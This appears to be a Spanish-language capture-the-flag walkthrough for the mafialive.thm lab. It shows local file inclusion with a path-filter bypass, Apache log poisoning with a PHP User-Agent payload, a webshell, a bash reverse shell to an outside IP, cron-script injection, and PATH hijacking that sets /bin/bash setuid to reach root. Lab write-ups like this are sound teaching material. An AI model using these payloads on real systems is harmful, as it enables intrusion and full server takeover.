PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

-Entramos al puerto 80 y vemos un dominio interesante , lo añadimos al /etc/host:
	-mafialive.thm 

-Hacemos Fuzzing y encontramos la ruta test.php, le damos al botón que aparece y la URL se ve así:
	-http://mafialive.thm/test.php?view=/var/www/html/development_testing/mrrobot.php

-Usamos el siguiente Wrapper de la siguiente manera para poder ver el código fuente de test.php:
	-http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php
		-Cadena en base64(Muy larga)

-Decodificamos la cadena para ver el código fuente:
	-echo 'cadena' | base64 -d
		if(!containsStr($_GET['view'], '../..') && containsStr($_GET['view'], '/var/www/html/development_testing')) {
            	include $_GET['view'];
            }else{
		echo 'Sorry, Thats not allowed';
            }

-Está incluyendo archivos siempre y cuando no tengan (../..) y esté incluida la ruta: /var/www/html/development_testing

-La restricción se puede saltar de estas formas:
	-Forma 1: 
		-http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//..//..//..//..//..//etc/passwd
	-Forma 2:
		-http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././../etc/passwd

## LFI to RCE

-Probamos a ver los logs de Apache:
	-http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././..//var/log/apache2/access.log
		-LOS VEMOS!!

-Ejecutamos un comando en el servidor:
	-curl -s -X GET 'http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././..//var/log/apache2/access.log' -H "User-Agent: <?php system('id');?>"
		uid=33(www-data) gid=33(www-data) groups=33(www-data)

-Subimos una webshell al servidor:
	-curl -s -X GET 'http://mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././..//var/log/apache2/access.log' -H "User-Agent: <?php system(\$_GET['c']);?>"
	-Desde la URL:
		-mafialive.thm/test.php?view=/var/www/html/development_testing/.././.././.././.././..//var/log/apache2/access.log&c=bash -c 'bash -i >%26 /dev/tcp/10.9.2.76/1234 0>%261'
			www-data@ubuntu:/$ whoami
			www-data

## Escalada de Privilegios

-En /opt tenemos permisos de escritura sobre el archivo helloworld.sh , inyectamos una rs y esperamos a que el usuario archange ejecute el archivo mediante una tarea cron.
	archangel@ubuntu:~/secret$ whoami
		archangel

-Dentro del directorio /secret encontramos 'backup' , al ver su contenido vemos la siguiente línea:
	-cp /home/user/archangel/myfiles/* /opt/backupfiles
	(Tenemos permisos de ejecución sobre el archivo 'backup')

-Está usando el binario 'cp' sin la ruta absoluta, por lo que podemos aplicar una 'PATH HIjacking' para escalar privilegios!!

#### Path Hijacking 

-Nos vamos a /tmp y creamos el archivo 'cp' , con el siguiente contenido:
	-chmod u+s /bin/bash

-Le damos permisos de ejecución (+x) --> chmod +x cp

-Cambiamos la ruta del PATH para que empiece a buscar en /tmp:
	-export PATH=/tmp:$PATH

-Comprobamos que el PATH ha cambiado:
	-echo $PATH
		/tmp:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

-Ejecutamos el archivo 'backup':
	-cd /home/archangel/secret
	./backup
	-bash -p
		bash-4.4# whoami
		root
